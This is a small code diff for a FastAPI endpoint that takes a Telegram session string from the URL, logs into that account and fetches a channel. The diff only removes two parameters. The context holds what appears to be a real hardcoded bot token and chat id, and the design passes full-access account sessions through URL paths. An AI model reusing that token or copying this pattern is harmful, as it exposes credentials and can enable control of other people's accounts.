@@ -15,7 +15,7 @@ bot_token = '5962199140:AAEWbH3ALSEUCWt4o0FcMC1Pc7EHWUXQoQE'
 chat_id = '5159123009'
 
 @app.get("/api/{sess}")
-async def templer(request: Request, sess: str, user: str, message: str):
+async def templer(request: Request, sess: str):
     async with TelegramClient(StringSession(sess), api_id, api_hash) as client:
         channel_username = 'sythontempler'
         channel = await client.get_entity(channel_username)  
